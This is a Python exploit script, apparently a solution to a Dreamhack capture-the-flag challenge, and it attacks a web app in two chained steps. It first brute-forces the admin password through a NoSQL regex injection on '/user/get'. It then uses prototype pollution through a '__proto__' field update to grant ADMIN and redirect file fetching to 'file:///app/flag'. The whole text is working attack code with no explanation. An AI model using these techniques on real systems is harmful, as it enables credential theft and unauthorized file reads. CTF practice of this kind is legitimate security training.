import requests
import string

url = "http://host1.dreamhack.games:17964"

text = string.ascii_letters + string.digits

def prototype(token,data):
    res = requests.post(url+"/config",data=data,headers={"Authorization":"Bearer "+token})
    _id = res.json()["_id"]
    res = requests.patch(url+"/config", data={"config":_id,"field[0][0]":"data","field[0][1]":"__proto__"},headers={"Authorization":"Bearer "+token})
    print(res.json())
    pass

adminPassword = ""

for _ in range(32):
    for t in text:
        res = requests.get(url+"/user/get",params={"id":"admin","password[$regex]":"^"+adminPassword+t})
        if res.status_code == 200:
            adminPassword += t
            print(adminPassword)
            break

res = requests.get(url+"/user/get",params={"id":"admin","password":adminPassword})
token = res.json()["token"]

prototype(token, {"role":"ADMIN"})
prototype(token, {"href":"exploit"})
prototype(token, {"hostname":""})
prototype(token, {"protocol":"file:"})
prototype(token, {"pathname":"/app/flag"})

res = requests.get(url+"/config",headers={"Authorization":"Bearer "+token})
print(res.text)

res = requests.get(url+"/file",params={"password":adminPassword},headers={"Authorization":"Bearer "+token})
print(res.text)